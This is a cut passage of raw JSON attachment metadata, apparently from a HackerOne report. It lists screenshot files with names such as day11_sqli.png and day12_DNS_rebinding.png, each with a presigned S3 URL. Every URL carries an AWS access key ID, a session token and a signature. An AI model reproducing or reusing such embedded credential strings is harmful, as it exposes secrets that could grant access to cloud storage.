6\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0614770169dfd32a9c9b33efa670bfbccc6a11984dec3588a8e5f1fcb8ea3bd3"},{"id":1139725,"filename":"day5_login.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vjeut5at5wpx8at2vr9ja7ews34e?response-content-disposition=attachment%3B%20filename%3D%22day5_login.png%22%3B%20filename%2A%3DUTF-8%27%27day5_login.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=86aa7ff66713be4893790e36da04de2bfe64cef535a63f83c0b8098d995e03e0"},{"id":1139726,"filename":"day5_no_files.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pfm5c8w3lsfbhxminj2ku0bo4vqj?response-content-disposition=attachment%3B%20filename%3D%22day5_no_files.png%22%3B%20filename%2A%3DUTF-8%27%27day5_no_files.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=aa09a3bb5a7cb4f2d6b34dcfe80dc1c696f66587d9c13ba0dca373b421b73016"},{"id":1139830,"filename":"day11_index.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y88bxhws0huxp2tpoof78301t7bs?response-content-disposition=attachment%3B%20filename%3D%22day11_index.png%22%3B%20filename%2A%3DUTF-8%27%27day11_index.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=371d5732a5de3924519fe56aa4c54c1d2f4a9bed59da7cacd5a4b8b6b55599ba"},{"id":1139835,"filename":"day12_local_detection.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/56u0zgjciyw9hkp9yd0nv7c4dqab?response-content-disposition=attachment%3B%20filename%3D%22day12_local_detection.png%22%3B%20filename%2A%3DUTF-8%27%27day12_local_detection.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d7f9c124acf34aaf7bbfc6c0c05c13073e958f95c9135c03d3ca4fadec2a1d31"},{"id":1139836,"filename":"day12_index.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kl6x9icd8hri48xo17pxhzbvbut5?response-content-disposition=attachment%3B%20filename%3D%22day12_index.png%22%3B%20filename%2A%3DUTF-8%27%27day12_index.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2f2b5851bdec9a02ed7e777f063496bf26e012ad292ff8fa45890d70bfaf1485"},{"id":1139837,"filename":"day12_attack.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uip1essudm73wzgsj5bqo0im55ri?response-content-disposition=attachment%3B%20filename%3D%22day12_attack.png%22%3B%20filename%2A%3DUTF-8%27%27day12_attack.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f7c1710a29fe0a3d77e2afc4634d3211db01d9d416641e513ffbd1230f6e587f"},{"id":1139838,"filename":"day12_DNS_rebinding.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yazvqep4qz15pcvur2kpn7s373wt?response-content-disposition=attachment%3B%20filename%3D%22day12_DNS_rebinding.png%22%3B%20filename%2A%3DUTF-8%27%27day12_DNS_rebinding.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=16b6d55bd5ee29aef60fac9acf7d897d783b2849c8a915c2ea86eee19a6f401d"},{"id":1139839,"filename":"day12_flag.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wzbkfvlhnhrlt1nz7xwaxz20cu0b?response-content-disposition=attachment%3B%20filename%3D%22day12_flag.png%22%3B%20filename%2A%3DUTF-8%27%27day12_flag.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c7c6750d080980e79429bec5a9d9f225b81489e786705bf1b524385352258a27"},{"id":1139842,"filename":"day11_sql_wildcard.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pv7uk6rqvfdvkuj1n8wl2kqv2z72?response-content-disposition=attachment%3B%20filename%3D%22day11_sql_wildcard.png%22%3B%20filename%2A%3DUTF-8%27%27day11_sql_wildcard.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d0a612eed0b909a6f8224b1e870f65dcf679c752937124bd517883c19b9771fb"},{"id":1139843,"filename":"day11_sqli.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nbfdgzk4fchvsxehxj64yt9one8x?response-content-disposition=attachment%3B%20filename%3D%22day11_sqli.png%22%3B%20filename%2A%3DUTF-8%27%27day11_sqli.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOT